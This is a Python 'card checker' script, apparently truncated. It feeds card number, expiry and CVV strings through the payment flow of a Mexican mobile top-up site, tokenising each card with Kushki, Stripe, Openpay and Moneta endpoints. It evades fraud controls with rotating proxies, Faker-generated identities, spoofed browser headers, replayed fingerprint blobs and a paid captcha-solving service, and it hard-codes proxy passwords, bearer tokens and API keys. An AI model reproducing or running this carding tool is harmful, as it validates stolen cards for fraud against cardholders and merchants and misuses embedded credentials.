import ast
import email
from email import message
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
from numpy import append
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#

            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization',
                'access-control-request-method': 'GET',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': '5586396888',
                'service_type': 'mbb',
            }

            response = c.options('https://compartcarga.api.koonolmexico.com/tenants/dids', params=params, headers=headers)
            time.sleep(3) 

            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI5ZGY5ZjQyYi0zYTIyLTQwYWItOTJiMy05OGY0NGM0ZDM5Y2QifQ.Vx-lFf6dwP2mYUrmqLTQLG9EP27kO5ciWk-gqZJSXW8',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': '5586396888',
                'service_type': 'mbb',
            }

            response = c.get('https://compartcarga.api.koonolmexico.com/tenants/dids', params=params, headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI5ZGY5ZjQyYi0zYTIyLTQwYWItOTJiMy05OGY0NGM0ZDM5Y2QifQ.Vx-lFf6dwP2mYUrmqLTQLG9EP27kO5ciWk-gqZJSXW8',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': '5586396888',
            }

            response = c.get('https://compartcarga.api.koonolmexico.com/tenants/altan_profile', params=params, headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI5ZGY5ZjQyYi0zYTIyLTQwYWItOTJiMy05OGY0NGM0ZDM5Y2QifQ.Vx-lFf6dwP2mYUrmqLTQLG9EP27kO5ciWk-gqZJSXW8',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': '5586396888',
            }

            response = c.get('https://compartcarga.api.koonolmexico.com/tenants/altan_profile', params=params, headers=headers)
            time.sleep(3)
            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'slug': 'mi-movil',
            }

            response = c.get('https://compartcarga.api.koonolmexico.com/tenants/theme_settings', params=params, headers=headers)
            time.sleep(3)
            soup = b(response.text, 'html.parser')
            #response_text = response.text
            #print(response_text)
            #responsePm = json.loads(response.text)
            #print(responsePm)
            headers = {
                'authority': 'm.stripe.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'text/plain;charset=UTF-8',
                # 'cookie': 'm=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5',
                'origin': 'https://m.stripe.network',
                'pragma': 'no-cache',
                'referer': 'https://m.stripe.network/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjIzODYwNGNmZjFhMDg5NDI1NWIyMGE1MDY5NTdhZjA5NCUyMiUyQyUyMnQlMjIlM0ExNi4xJTJDJTIydGFnJTIyJTNBJTIyJTI0bnBtX3BhY2thZ2VfdmVyc2lvbiUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQW51bGwlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGOEpTWFFOX09vU3VWVC1JTlhSMWh6RUZOVUtVWjRoaXNKSFlQeVNjSlNLYy4xTmIyS045em1TeXRLazgyc3JTelUzOXZ0MmJwaEtISGF6My1Yc2dneTUwLmcydTktaHFadkdJcVlKY1BsUGZ3SkFmLXYzUmd5S194MU5wcHpBbEExMk0uRmRRcDB0TkR3VGMzN2NjR1JtS0xILXZ3djFsY3Y3aUUzQVRXVXk1XzNLRSUyRjVuYUxCQld6T2UzSF9rbVFra3lDOFp6Zmk2X0hKcmhTcUZ1RktHel9EcUUlM0ZyaTZyaUdRSGJQZEFUeFBxS1ZWSzlFN3ZuS0pFYk9kNjZLbzJuRXFXT0c4JTNEYUpNRVVFS3piUWpjMWZEZFFDa1BsdHpNVVNMemt2dmFURlZFQ1Bzcm40byUyNkhVM0JEbnkzT1R5aWVMOUp3WnRrWTJzMGk5UC1IV2JibEpjd3FhWS15UnMlM0Q0aG5CWFNmd1lGYWU0d01HaTJkaTNITzE4TS1jUHFxMjl6RDBibTRYN3VFJTI2VC1xZWZmZDllUldhOWZuOVI1S3lBSFJIeDdFSV9malpJZFZBeWprN2tTYyUzRFVTRFlwR2NvLUtkZDB2T2IxUmxIWEI4dTMwenZGZE5fS3FHRG5ZQmZoak0lMjZ3ZVJjYjRwYTJNb2E3R041N1lZc2VPcWtWSkxyWEJla1haZjllMDBQVGw0JTNEVHJSay1aeHN4UC1sUm9fN0RvU0tRNmR3UmsyRVdfTkx4ZTdLUWpUSDExSSUyMiUyQyUyMmIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRjhKU1hRTl9Pb1N1VlQtSU5YUjFoekVGTlVLVVo0aGlzSkhZUHlTY0pTS2MuMU5iMktOOXptU3l0S2s4MnNyU3pVMzl2dDJicGhLSEhhejMtWHNnZ3k1MC5nMnU5LWhxWnZHSXFZSmNQbFBmd0pBZi12M1JneUtfeDFOcHB6QWxBMTJNLkZkUXAwdE5Ed1RjMzdjY0dSbUtMSC12d3YxbGN2N2lFM0FUV1V5NV8zS0UlMkY1bmFMQkJXek9lM0hfa21Ra2t5QzhaemZpNl9ISnJoU3FGdUZLR3pfRHFFJTJGWWx0b19UWmlrS1dSd0dPNTR6c0xXUHc1QXd1WU1FTmM3S093Sm41OE55USUyMiUyQyUyMmMlMjIlM0ElMjJfZUdqeTNuam1QY2pxSU9FR25pUC1RcGIyc0xhVWhlZHN6bXl4ZEZocEFnJTIyJTJDJTIyZCUyMiUzQSUyMmRkMTMxNTZlLWU5ODYtNDc2Mi1iMTJhLWMwMTJlYWU5NzJhOTRmYjM0YiUyMiUyQyUyMmUlMjIlM0ElMjI4OWQwNzA5NC0yNGZmLTQyOTYtOGQ4ZC1jMjYzNDFjMGRkMzBlMmZkYTMlMjIlMkMlMjJmJTIyJTNBZmFsc2UlMkMlMjJnJTIyJTNBdHJ1ZSUyQyUyMmglMjIlM0F0cnVlJTJDJTIyaSUyMiUzQSU1QiUyMmxvY2F0aW9uJTIyJTVEJTJDJTIyaiUyMiUzQSU1QiU1RCUyQyUyMm4lMjIlM0E0MC4wOTk5OTk5MDQ2MzI1NyUyQyUyMnUlMjIlM0ElMjJyZWNhcmdhLm1pbW92aWwuY29tLm14JTIyJTJDJTIydiUyMiUzQSUyMnJlY2FyZ2EubWltb3ZpbC5jb20ubXglMjIlMkMlMjJ3JTIyJTNBJTIyMTc0NzA5OTk0MTM1NiUzQTViYzI0MjExZDI5OTEyYTQwOTNiYjAzYzAwZGNkOTk3NzA2YzUzNzRiZmFjNWFjYTM2OTc1Mzc0M2UwZWUxZTclMjIlN0QlMkMlMjJoJTIyJTNBJTIyYzhhZGMzNWJjNTQ2ODVkODczZGYlMjIlN0Q': '',
            }

            response = c.post('https://m.stripe.com/6',  headers=headers, data=data)
            time.sleep(3)
            #response_text = response.text
            #print(response_text)
            #responsePm = json.loads(response.text)
            #print(responsePm)

            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'slug': 'mi-movil',
            }

            response = c.get('https://compartcarga.api.koonolmexico.com/tenants/theme_settings', params=params, headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization,content-type',
                'access-control-request-method': 'GET',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.options('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/antifraudkeys', headers=headers)
            time.sleep(3)
            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                's': 'eKZPKqD80p8lGc8W7RItv23zSlQOlPmC',
            }

            response = c.get('https://api.openpay.mx/antifraud/m3mv7moncxdhvlpexzd0/components', params=params, headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'api.kushkipagos.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'public-merchant-id': '20821eabbd14463f8fe25982a6a01d3d',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://api.kushkipagos.com/merchant/v1/merchant/settings', headers=headers)
            time.sleep(3)
            headers = {
                'authority': 'api.kushkipagos.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'content-type,public-merchant-id,x-amz-meta-kushki-info',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.options('https://api.kushkipagos.com/card/v1/tokens', headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'api.kushkipagos.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'public-merchant-id': '20821eabbd14463f8fe25982a6a01d3d',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-amz-meta-kushki-info': 'eyJwbGF0Zm9ybUlkIjoiS1AwMDIiLCJwbGF0Zm9ybVZlcnNpb24iOiIxLjM5LjkifQ==',
            }

            json_data = {
                'totalAmount': 50,
                'card': {
                    'cvv': cvv,
                    'expiryMonth': mes,
                    'expiryYear': ano_number[-2:],
                    'name': name+last,
                    'number': cc_number,
                },
                'currency': 'MXN',
                'isDeferred': False,
                'merchantName': 'MI MOVIL',
                'sessionId': 'bdab5ed7-57d6-4de7-a353-e4bc64b9fe73',
                'userId': '20821eabbd14463f8fe25982a6a01d3d4169164469',
            }

            response = c.post('https://api.kushkipagos.com/card/v1/tokens', headers=headers, json=json_data)
            time.sleep(3)
            responsePm = json.loads(response.text)
            tokenkus = responsePm['token']
            print(tokenkus)
            #print(responsePm)
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=10336726&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=ce6ea4eb-fe2e-4cc1-9220-6a48917b7d4525d57b&sid=af3e09aa-437b-4090-8e18-5202fe865f04ff323f&key=pk_live_51PyHMpEQoKLw3xOlGTzEUCu46a5XbGcqmT4Mq9gaNeWitLRHIcJQfg1GMzAR7d9FKuZaZfzRlGPedd7oOYlpbQ2q00rlxlFmOE&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            time.sleep(3)
            #response_text = response.text
            #print(response_text)
            responsePm = json.loads(response.text)
            tokenkst = responsePm['id']
            print(tokenkst)
            #print(responsePm)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization,content-type',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.options('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/tokens', headers=headers)
            time.sleep(3)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic cGtfNzA1NmQxMjlmZGI2NDUyOTgzYTg3YzBjZmFlMTEyMDY6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'holder_name': name+' '+last,
                'card_number': cc_number,
                'cvv2': cvv,
                'expiration_month': mes,
                'expiration_year': ano_number[-2:],
            }

            response = c.post('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/tokens', headers=headers, json=json_data)
            time.sleep(3)
            responsePm = json.loads(response.text)
            #tokenop = responsePm['id']
            print(responsePm)
            #responsePm = json.loads(response.text)
            #print(responsePm)

            headers = {
                'authority': 'financialapi.saas.moneta.com.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic MTM4OnJLP0dJd3RVNU8zVUAzVzJrb0IhPzViJnI/JUF0ZlRvSWM2RSVVWGxSVXIyOVUhdDN4Z0k4VlIlV1RaVUYjQHY=',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'request-reference-no': '398563457585',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'serviceName': 'enrollCardToken',
                'countryCode': '484',
                'channel': 'ECOMMERCE',
                'reason': '01',
                'localTransactionDateTime': '12052025204912',
                'storeReference': '138',
                'retrievalReferenceNumber': '398563457585',
                'secureFields': 'evEQT1M9TEWb63l9%m5hXY6GKTUE3FHCp6C7hZFEsW+goja80ItvLGJzwgYnChA7MpS6bmwix8tXFiE9GdQBf+W1OhzNKdtR0yqB0v8pvX3HNeDnbjIrfgQlZFOb9GHrJQ4/8dF7BZzRMwkzuPkt4JQXrV6gzasYDEpE54qESNSkR9mLZs+UAUmu3VbvxvG3+9UjF9zmQrSbytQznGLWvycJi2LoEttdbHcpdAwo5HO0ktWpq9FLNZpByoR/6G41jzd5mxr5n8ydsmEX9dbXwVH5/7mzMnbJ7ctBLxqQ7HTEECG4PBFmgPKlkJ1QA3AxA2g00ME/LPd2m5pHBWSFw8tzCH1dFkIADQmoB35NhKScNsFZyt72+hsnJTTKG2vKB91qnd9MpZPzQ4hn0d6+oCEXvAOkvVw/SpE2TbjWdnmaHToCbl4Nx35Nu1fS8VbUfSCgvppO+S3JbEhU1le4zR2r+P15WZsMjr0UE//zK2fhH6f7FHwYYgv8QirSFUT8sibnNlFybWWt0SfvMKQqAT6EQFbZ2uV7ph71O8rF6FeW1BS2Q+pQt5F5Licfq6mzYNUmMbPOqiPN9q743B/Fps1ip3gdHtnxXyJQ2VaOVcrDW07zMOdTyEI8TLyGcPreDF8pCHn3e1k20cBGC7nmEVF2RTkCscIZb8MWQiJ/ntmyv1qh7M6JZWRz0V5A=%oP/yp36YgujXXrcY6MqJQRd56kqj0dkffCUiZypxTqYv0xhLDrEypH4V+qLKLIHO6V2JYPbNyeV7D+5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC+CsxmLfklYa6sVF9d2Hw==',
            }

            response = c.post(
                'https://financialapi.saas.moneta.com.mx/WS_MonetaFinancial/api/cardManagement/enrollCardToken_sync',
                headers=headers,
                json=json_data,
            )
            time.sleep(3)
            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI5ZGY5ZjQyYi0zYTIyLTQwYWItOTJiMy05OGY0NGM0ZDM5Y2QifQ.Vx-lFf6dwP2mYUrmqLTQLG9EP27kO5ciWk-gqZJSXW8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'payment_gateway_tokenize_error[external_id]': 'f0236ba7-fe6b-490e-9c9f-daaab084de8a',
                'payment_gateway_tokenize_error[payment_gateway]': 'openpay',
                'payment_gateway_tokenize_error[gateway_data][message]': 'Request error',
                'payment_gateway_tokenize_error[gateway_data][status]': '401',
                'payment_gateway_tokenize_error[gateway_data][data][http_code]': '401',
                'payment_gateway_tokenize_error[gateway_data][data][error_code]': '1014',
                'payment_gateway_tokenize_error[gateway_data][data][category]': 'request',
                'payment_gateway_tokenize_error[gateway_data][data][description]': 'Your account is inactive, please contact to soporte@openpay.mx for more information',
                'payment_gateway_tokenize_error[gateway_data][toString]': 'undefined [status ]',
            }

            response = c.post('https://compartcarga.api.koonolmexico.com/payment_gateway_tokenize_errors', headers=headers, data=data)
            time.sleep(3)
            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.options('https://compartcarga.api.koonolmexico.com/tenants/2/payments', headers=headers)
            time.sleep(3)
            

            
            headers = {
                'authority': 'compartcarga.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
